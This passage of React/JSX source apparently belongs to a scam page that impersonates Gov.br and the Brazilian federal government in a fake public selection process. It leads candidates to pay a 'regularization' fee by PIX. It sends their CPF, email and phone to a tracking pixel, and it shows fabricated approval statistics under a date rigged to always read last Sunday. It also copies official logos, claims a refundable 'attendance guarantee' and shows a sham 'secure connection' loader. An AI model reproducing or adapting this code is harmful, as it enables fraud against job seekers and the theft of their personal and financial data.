                <Checkbox 
                  checked={acceptTerms}
                  onCheckedChange={
                    (checked) => {
                      const VagaSelecionada = JSON.parse(localStorage.getItem("VagaSelecionada") || '{}')
                      handleStepAcceptance(0, checked as boolean)
                      if (checked) {
                        const userBasic = getUserBasicData()

                        pixel.identify({
                          external_id: userBasic?.cpf,
                          email: userBasic?.email,
                          phone: toE164(userBasic?.phone)
                        })
                        pixel.addPaymentInfo(
                          {
                            contents: [
                              { content_id: VagaSelecionada.title.toLowerCase().replace(/[^a-z0-9]/gi, ''), quantity: 1, price: certificationValue }
                            ], value: certificationValue, content_type: "product", content_name: VagaSelecionada.title, currency: "BRL",
                          })
                      }
                    }}
                  className="mt-0.5"
                />
                <span className="text-gray-700 leading-relaxed">
                  {getGenderedText(userGender, 'Estou ciente dos requisitos estabelecidos para participação no processo seletivo público', 'Estou ciente dos requisitos estabelecidos para participação no processo seletivo público')}
                </span>
              </label>
            </div>
          </div>

          {/* Step 1: Benefícios e Garantias - Design Minimalista */}
          {currentStep >= 1 && (
            <div ref={step1Ref} className={`mb-6 transition-all duration-500 ${currentStep >= 1 ? 'opacity-100' : 'opacity-0'}`}>
              
              {/* Benefícios incluídos */}
              <div className="border-l-4 border-[#1351B4] bg-white p-6 mb-6">
                <h5 className="font-medium text-[#333333] mb-4">Benefícios incluídos na regularização</h5>
                <div className="space-y-3 text-sm text-gray-700">
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-[#1351B4] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <span>Vaga garantida no local e horário escolhidos</span>
                  </div>
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-[#1351B4] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <span>Acesso ao portal exclusivo do candidato</span>
                  </div>
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-[#1351B4] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <span>Material orientativo digital</span>
                  </div>
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-[#1351B4] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <span>Suporte técnico especializado</span>
                  </div>
                </div>
              </div>

              {/* Garantias - Design Clean */}
              <div className="bg-gray-50 border border-gray-200 rounded p-6 mb-6">
                <h5 className="font-medium text-[#333333] mb-4">Garantias oferecidas</h5>
                <div className="space-y-4 text-sm">
                  <div>
                    <p className="font-medium text-green-700">Devolução após comparecimento</p>
                    <p className="text-gray-600">Valor integral da garantia devolvido automaticamente após sua presença na prova</p>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Cancelamento oficial</p>
                    <p className="text-gray-600">Reembolso integral se o processo for cancelado pela organização</p>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Mudança de local</p>
                    <p className="text-gray-600">Transporte garantido em caso de alteração de endereço da prova</p>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Justificativa médica ou trabalhista</p>
                    <p className="text-gray-600">Reembolso de 100% com atestado médico ou declaração do trabalho até 7 dias antes da prova</p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-50 border border-gray-200 rounded p-4">
                <label className="flex items-start space-x-3 cursor-pointer text-sm">
                  <Checkbox 
                    checked={acceptPriority}
                    onCheckedChange={(checked) => handleStepAcceptance(1, checked as boolean)}
                    className="mt-0.5"
                  />
                  <span className="text-gray-700 leading-relaxed">
                    {getGenderedText(userGender, 'Aceito os termos e condições para participação no processo seletivo', 'Aceito os termos e condições para participação no processo seletivo')}
                  </span>
                </label>
              </div>
            </div>
          )}

          {/* Step 2: Informações importantes - Design Minimalista */}
          {currentStep >= 2 && (
            <div ref={step2Ref} className={`mb-6 transition-all duration-500 ${currentStep >= 2 ? 'opacity-100' : 'opacity-0'}`}>
              
              {/* Informações do processo */}
              <div className="bg-blue-50 border border-blue-200 rounded p-6 mb-6">
                <h5 className="font-medium text-[#333333] mb-4">Informações importantes</h5>
                <div className="space-y-3 text-sm text-gray-700">
                  <p>Esta garantia comprova seu comprometimento com o processo seletivo e será devolvida após o comparecimento.</p>
                  <p>{getGenderedText(userGender, 'Candidatos que confirmam presença através da quitação têm maior índice de comparecimento e aprovação.', 'Candidatas que confirmam presença através da quitação têm maior índice de comparecimento e aprovação.')}</p>
                  <p>A regularização garante sua participação no processo seletivo e acesso aos recursos de apoio.</p>
                  <p>Em caso de cancelamento oficial do processo, o valor é integralmente reembolsado.</p>
                </div>
              </div>

              {/* Estatísticas simples */}
              <div className="border border-gray-200 rounded p-6 mb-6">
                <h5 className="font-medium text-[#333333] mb-4">Dados do programa</h5>
                <div className="grid grid-cols-2 gap-6 text-center">
                  <div>
                    <div className="text-xl font-medium text-[#1351B4]">1.437</div>
                    <div className="text-xs text-gray-600">{getGenderedText(userGender,'candidatos aprovados', 'candidatas aprovadas')}</div>
                  </div>
                  <div>
                    <div className="text-xl font-medium text-[#1351B4]">94%</div>
                    <div className="text-xs text-gray-600">guia de regularização</div>
                  </div>
                </div>
                <p className="text-xs text-gray-500 mt-4 text-center">Dados da seleção de {(() => {
                  const today = new Date();
                  const dayOfWeek = today.getDay();
                  const daysToSubtract = dayOfWeek === 0 ? 7 : dayOfWeek; // Se hoje é domingo (0), pega domingo anterior (7 dias), senão pega último domingo
                  const lastSunday = new Date(today);
                  lastSunday.setDate(today.getDate() - daysToSubtract);
                  return lastSunday.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
                })()}</p>
              </div>

              <div className="bg-gray-50 border border-gray-200 rounded p-4">
                <label className="flex items-start space-x-3 cursor-pointer text-sm">
                  <Checkbox 
                    checked={acceptCommitment}
                    onCheckedChange={(checked) => handleStepAcceptance(2, checked as boolean)}
                    className="mt-0.5"
                  />
                  <span className="text-gray-700 leading-relaxed">
                    {getGenderedText(userGender, 'Confirmo minha participação no processo seletivo e finalização da inscrição', 'Confirmo minha participação no processo seletivo e finalização da inscrição')}
                  </span>
                </label>
              </div>
            </div>
          )}

       
          {/* Payment Section - Design Minimalista */}
          {currentStep >= 3 && (
            <div ref={paymentRef} className={`transition-all duration-500 ${currentStep >= 3 ? 'opacity-100' : 'opacity-0'}`}>
              
              {/* Finalização da inscrição */}
              <div className="border border-gray-200 rounded p-6 mb-6">
                <h5 className="font-medium text-[#333333] mb-6 text-center">Finalização da Inscrição</h5>
                
                <div className="mb-6">
                  <p className="text-sm text-gray-600">
                    {getGenderedText(userGender, 'Para concluir sua inscrição, é necessário gerar a Guia de Regularização e efetuar a quitação em qualquer agência bancária ou via internet banking', 'Para concluir sua inscrição, é necessário gerar a Guia de Regularização e efetuar a quitação em qualquer agência bancária ou via internet banking')}.
                  </p>
                </div>

                {/* Botão de pagamento */}
                <div className="text-center">
                  <Button
                    onClick={handleCertificationPayment}
                    className="w-full bg-[#1351B4] hover:bg-blue-700 text-white py-3 px-6 font-medium transition-colors"
                  >
                    Gerar Guia de Regularização
                  </Button>
                  <p className="text-xs text-gray-500 mt-3">
                    Processamento seguro • Confirmação por email
                  </p>
                </div>
              </div>

              {/* Esclarecimentos */}
              <div className="border border-gray-200 rounded p-4">
                <h6 className="font-medium text-[#333333] mb-3">Esclarecimentos</h6>
                <div className="space-y-3 text-xs text-gray-600">
                  <div>
                    <span className="font-medium text-gray-700">Reembolso:</span> 100% com atestado médico ou declaração trabalhista até 7 dias antes da prova
                  </div>
                  <div>
                    <span className="font-medium text-gray-700">Validade:</span> Protocolo válido por 30 dias a partir da emissão
                  </div>
                  <div>
                    <span className="font-medium text-gray-700">Suporte:</span> Atendimento disponível via canais oficiais
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      <GovBrFooter />

      {/* Payment Generation Modal - Secure Environment */}
      <Dialog open={showPaymentModal} onOpenChange={() => {}}>
        <DialogOverlay className="bg-black/40" />
        <DialogContent className="max-w-xs mx-auto bg-white rounded border-0 p-0 shadow-lg">
          <div className="p-8 text-center">
            {/* Gov.br logo */}
            <div className="mb-6">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
                alt="Gov.br"
                className="h-7 w-auto mx-auto"
              />
            </div>

            {paymentGenerationStep === -1 ? (
              // Error state
              <div>
                <div className="w-8 h-8 mx-auto bg-red-100 rounded-full flex items-center justify-center mb-4">
                  <AlertTriangle className="w-4 h-4 text-red-600" />
                </div>
                <p className="text-sm text-gray-700 mb-6">Falha na conexão segura</p>
                <Button
                  onClick={() => {
                    setShowPaymentModal(false);
                    setTimeout(() => handleCertificationPayment(), 500);
                  }}
                  className="w-full bg-[#1351B4] hover:bg-blue-700 text-white h-9 text-sm"
                >
                  Reestabelecer Conexão
                </Button>
              </div>
            ) : paymentGenerationStep >= paymentSteps.length ? (
              // Success state
              <div>
                <div className="w-8 h-8 mx-auto bg-green-100 rounded-full flex items-center justify-center mb-4">
                  <Shield className="w-4 h-4 text-green-600" />
                </div>
                <p className="text-sm text-gray-700">Ambiente seguro estabelecido</p>
              </div>
            ) : (
              // Loading state
              <div>
                <div className="w-8 h-8 mx-auto mb-6">
                  <div className="w-8 h-8 border-2 border-gray-200 border-t-[#1351B4] rounded-full animate-spin"></div>
                </div>
                
                <p className="text-sm text-gray-700 mb-4">
                  {paymentSteps[paymentGenerationStep]?.title || 'Processando...'}
                </p>

                {/* Security indicator */}
                <div className="w-16 h-0.5 bg-gray-200 rounded mx-auto mb-4">
                  <div 
                    className="h-0.5 bg-[#1351B4] rounded transition-all duration-300"
                    style={{ width: `${((paymentGenerationStep + 1) / paymentSteps.length) * 100}%` }}
                  ></div>
                </div>

                <div className="flex items-center justify-center text-xs text-gray-500">
                  <Shield className="w-3 h-3 mr-1" />
                  Conexão protegida
                </div>
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* PIX Payment Modal - Full Screen */}
      <Dialog open={showPixModal} onOpenChange={setShowPixModal}>
        <DialogContent className="w-screen h-screen max-w-none max-h-none m-0 rounded-none p-0 [&>button]:hidden overflow-y-auto bg-white">
          
          {/* Clean Header */}
          <div className="sticky top-0 z-10 bg-white border-b border-gray-200">
            <div className="flex items-center justify-between p-4 md:p-6">
              <div className="flex items-center space-x-4">
                <img 
                  src="https://i.ibb.co/b53ZGM19/Logo-Governo-Federal-2019-2022-1-removebg-preview.png" 
                  alt="Governo Federal" 
                  className="h-10 md:h-12 w-auto"
                />
                <div>
                  <h1 className="text-xl md:text-2xl font-semibold text-gray-900" style={{
      fontSize: '14px'
                  }}>Guia de Recolhimento da União</h1>
                  <p className="text-sm text-gray-600">Plano Nacional Banco do Brasil • Processo Seletivo</p>
                </div>
              </div>
            </div>
          </div>
          
          {/* Main Content */}
          <div className="flex-1 p-6 md:p-8 lg:p-12">
            <div className="max-w-5xl mx-auto">
              
              {/* Candidate Welcome */}
              <div className="text-center mb-8 md:mb-12">
                <h2 className="text-2xl md:text-3xl font-light text-gray-900 mb-2">
                  {getCandidateFirstName()}, finalize sua inscrição
                </h2>
                <p className="text-gray-600">Última etapa para confirmar sua participação</p>
              </div>

              {/* Two Column Layout */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16">
                
                {/* Left: Amount & QR Code */}
                <div className="space-y-8">
                  
                  {/* Amount */}
                  <div className="text-center">
                    <p className="text-sm text-gray-500 mb-2">Total para quitação</p>
                    <p className="text-5xl md:text-6xl font-light text-gray-900 mb-1">
                      {certificationValue === 0 ? (
                        <span className="text-gray-400">Carregando...</span>
                      ) : (
                        certificationValueFormatted
                      )}
                    </p>
                    <p className="text-sm text-gray-500">Quitação com Segurança Garantida.</p>
                    
                    {/* Garantia de Comparecimento */}
                    <div className="mt-4 border-l-2 border-gray-300 pl-3 text-left max-w-sm mx-auto">
                      <p className="text-gray-700 text-xs font-medium mb-1">
                        Garantia de comparecimento
                      </p>
                      <p className="text-gray-600 text-xs">
                        Valor devolvido integralmente após sua presença na prova
                      </p>
                    </div>
                  </div>

                  {/* QR Code */}
                  <div className="flex justify-center">
                    <div className="bg-gray-50 p-8 rounded-2xl">
                      <div className="w-64 h-64 md:w-80 md:h-80 bg-white rounded-xl flex items-center justify-center shadow-sm">
                        {pixData?.qrCode ? (
                          <img 
                            src={`${pixData.qrCode}`}
                            alt="QR Code PIX" 
                            className="w-full h-full object-contain p-4"
                          />
                        ) : pixData?.pixCode ? (
                          <img 
                            src={`https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=${encodeURIComponent(pixData.pixCode)}`}
                            alt="QR Code PIX" 
                            className="w-full h-full object-contain p-4"
                          />
                        ) : (
                          <div className="text-center">
                            <div className="w-16 h-16 border-2 border-gray-300 border-t-[#1351B4] rounded-full animate-spin mx-auto mb-4"></div>
                            <p className="text-gray-500">Gerando código...</p>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Right: Instructions & Code */}
                <div className="space-y-8">
                  
                  {/* PIX Code */}
                  <div>
                    <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                    <div className="space-y-4">
                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                        <p className="text-xs font-mono text-gray-700 break-all leading-relaxed"> 00020101021226880014br.gov.bcb.pix2566qrcode.banco.central.com.br/pix/2b87be2c-1b33-47bc-93a9-a426a47651005204000053039865802BR5924GOVERNO FEDERAL BRASILEIRO 62070503***6304C574
                        </p>
                      </div>
                      
                      <Button
                        onClick={handleCopyPixCode}
                        disabled={!pixData?.pixCode}
                        className="w-full py-3 text-base font-medium bg-[#1351B4] hover:bg-blue-700 text-white rounded-lg transition-colors"
                      >
                        {isCopied ? (
                          <div className="flex items-center justify-center">
                            <Check className="h-5 w-5 mr-2" />
                            Copiado
                          </div>
                        ) : (
                          <div className="flex items-center justify-center">
                            <Copy className="h-5 w-5 mr-2" />
                            Copiar código
                          </div>
                        )}
                      </Button>
                    </div>
                  </div>

                  {/* Instructions */}
                  <div>
                    <h3 className="text-lg font-medium text-gray-900 mb-4">Como quitar</h3>
                    <div className="space-y-3">
                      <div className="flex items-center text-gray-700">
                        <span className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-sm font-medium mr-3">1</span>
                        Abra seu aplicativo bancário
                      </div>
                      <div className="flex items-center text-gray-700">
                        <span className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-sm font-medium mr-3">2</span>
                        Acesse a área PIX
                      </div>
                      <div className="flex items-center text-gray-700">
                        <span className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-sm font-medium mr-3">3</span>
                        Escaneie o QR Code ou cole o código
                      </div>
                      <div className="flex items-center text-gray-700">
                        <span className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-sm font-medium mr-3">4</span>
                        Confirme a quitação
                      </div>
                    </div>
                  </div>

                  {/* Next Steps */}
                  <div className="bg-gray-50 p-6 rounded-lg">
                    <h4 className="font-medium text-gray-900 mb-3">Após a quitação</h4>
                    <p className="text-gray-600 text-sm leading-relaxed mb-3">
                      Seu protocolo será finalizado automaticamente. Você receberá confirmação com todas as informações necessárias para acompanhar o processo seletivo:
                    </p>
                    <div className="space-y-2 text-sm">
                      {getCandidateContactInfo().email && (
                        <div className="flex items-center text-gray-700">
                          <span className="font-medium text-gray-900 mr-2">Email:</span>
                          {getCandidateContactInfo().email}
                        </div>
                      )}
                      {getCandidateContactInfo().telefone && (
                        <div className="flex items-center text-gray-700">
                          <span className="font-medium text-gray-900 mr-2">SMS:</span>
                          {getCandidateContactInfo().telefone}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Footer */}
              <div className="text-center mt-12 pt-8 border-t border-gray-200">
                <div className="flex items-center justify-center mb-2">
                  <Shield className="w-4 h-4 text-gray-400 mr-2" />
                  <span className="text-sm text-gray-500">Quitação segura</span>
                </div>
                <p className="text-xs text-gray-400 mb-4">
                  Processado via sistema governamental • SSL • Dados criptografados
                </p>
                <Button
                  onClick={handleClosePixModal}
                  variant="ghost"
                  className="text-sm text-gray-500 hover:text-gray-700"
                >
                  Continuar após quitação
                </Button>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* SGPEC Modal - Design Minimalista */}
      <Dialog open={showSgpecModal} onOpenChange={handleCloseSgpecModal}>
        <DialogContent className="max-w-sm mx-auto">
          <div className="text-center p-4">
            <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <FileText className="w-6 h-6 text-[#1351B4]" />
            </div>
            <h3 className="text-base font-medium text-gray-900 mb-2">
              Acessar Portal do Detran {region?.toUpperCase()}
            </h3>
            <p className="text-sm text-gray-600 mb-4">
              Complete o seu registro no programa de forma imediata acessando com urgência o portal do Detran.
            </p>
            <Button
              onClick={handleCloseSgpecModal}
              className="w-full bg-[#1351B4] hover:bg-blue-700 text-white py-2 px-4 rounded text-sm"
            >
              Continuar
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Test Button - Only in dev environments */}
      {showTestButton && (
        <button
          onClick={() => setShowSgpecModal(true)}
          className="fixed bottom-4 right-4 bg-red-500 hover:bg-red-600 text-white p-3 rounded-full shadow-lg z-50 transition-all duration-200 text-xs font-medium"
          title="Testar Modal SGPEC"
        >
          TEST
        </button>
      )}
    </div>
  );
}